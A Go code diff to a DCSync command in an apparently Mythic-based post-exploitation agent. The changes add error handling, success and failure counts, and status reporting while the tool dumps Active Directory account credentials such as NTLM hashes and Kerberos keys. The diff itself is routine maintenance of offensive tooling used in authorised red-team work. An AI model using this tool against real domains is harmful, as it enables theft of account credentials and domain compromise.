@@ -50,6 +50,7 @@ type dcsyncResult struct {
 	PasswordLastSet         string
 	UserAccountControl      uint32
 	SupplementalCredentials []string // additional kerberos keys
+	Error                   string   `json:"error,omitempty"`
 }
 
 func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
@@ -211,6 +212,10 @@ func dcsyncExecuteKerberos(args dcsyncArgs, targets []string) structs.CommandRes
 	var results []dcsyncResult
 	for i, item := range crackedReply.Result.Items {
 		if item.Status != 0 {
+			results = append(results, dcsyncResult{
+				Username: targets[i],
+				Error:    fmt.Sprintf("CrackNames failed: status %d", item.Status),
+			})
 			continue
 		}
 		nc, err := cli.GetNCChanges(ctx, &drsuapi.GetNCChangesRequest{
@@ -230,6 +235,10 @@ func dcsyncExecuteKerberos(args dcsyncArgs, targets []string) structs.CommandRes
 			},
 		})
 		if err != nil {
+			results = append(results, dcsyncResult{
+				Username: targets[i],
+				Error:    fmt.Sprintf("GetNCChanges failed: %v", err),
+			})
 			continue
 		}
 		if r := dcsyncParseReply(cli, nc, targets[i]); r != nil {
@@ -247,7 +256,13 @@ func dcsyncFormatResults(args dcsyncArgs, targets []string, results []dcsyncResu
 	sb.WriteString(strings.Repeat("-", 60) + "\n")
 
 	var creds []structs.MythicCredential
+	var successCount int
 	for _, result := range results {
+		if result.Error != "" {
+			sb.WriteString(fmt.Sprintf("\n[-] %s: %s\n", result.Username, result.Error))
+			continue
+		}
+		successCount++
 		sb.WriteString(fmt.Sprintf("\n[+] %s (RID: %d)\n", result.Username, result.RID))
 		if result.NTHash != "" {
 			sb.WriteString(fmt.Sprintf("    NTLM:   %s\n", result.NTHash))
@@ -282,11 +297,21 @@ func dcsyncFormatResults(args dcsyncArgs, targets []string, results []dcsyncResu
 		}
 	}
 
-	sb.WriteString(fmt.Sprintf("\n[*] %d/%d accounts dumped successfully\n", len(results), len(targets)))
+	failCount := len(results) - successCount
+	if failCount > 0 {
+		sb.WriteString(fmt.Sprintf("\n[*] %d/%d accounts dumped, %d failed\n", successCount, len(targets), failCount))
+	} else {
+		sb.WriteString(fmt.Sprintf("\n[*] %d/%d accounts dumped successfully\n", successCount, len(targets)))
+	}
+
+	status := "success"
+	if successCount == 0 && len(targets) > 0 {
+		status = "error"
+	}
 
 	cmdResult := structs.CommandResult{
 		Output:    sb.String(),
-		Status:    "success",
+		Status:    status,
 		Completed: true,
 	}
 	if len(creds) > 0 {
